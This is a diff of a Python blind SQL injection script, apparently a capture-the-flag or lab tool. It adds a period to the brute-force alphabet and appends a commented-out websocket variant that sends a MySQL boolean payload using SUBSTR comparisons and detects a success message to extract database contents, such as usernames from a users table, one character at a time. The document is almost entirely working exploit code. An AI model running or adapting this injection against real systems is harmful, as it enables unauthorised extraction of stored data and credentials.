@@ -26,7 +26,7 @@ def dump_data(base_query):
         found_row = False
         for i in range(1, 100): 
             char_found = False
-            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@-:":
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@-:.":
                 if is_correct_char(i, char, base_query, row_offset):
                     extracted_string += char
                     print(extracted_string)
@@ -86,3 +86,23 @@ base_url = "http://127.0.0.1"
 # print(get_columns_for_table("users"))
 # print(dump_data("SELECT username FROM users"))
 # print(dump_entire_table("users"))
+
+
+''' Boolean SQLi in Websocket
+    def is_correct_char(index, char, base_query, row_offset):
+        ws = websocket.create_connection(f"ws://{rhost}/ws/")
+        ws.settimeout(RECV_TIMEOUT)
+        token = ws_recv_all(ws, payload_key="token")
+
+        full_query = f"{base_query} LIMIT 1 OFFSET {row_offset}"
+        # MYSQL payload (Have "BINARY" and ";")
+        payload = f"3 OR (SELECT BINARY SUBSTR(({full_query}), {index}, 1)) = '{char}';-- -"
+        try:
+            ws.send(json.dumps({"message": "available", "params": payload, "token": token}))
+            message = ws_recv_all(ws, payload_key="message")
+
+            # True Condition
+            return "Good news! This membership plan is available." in message
+        except:
+            return False
+'''
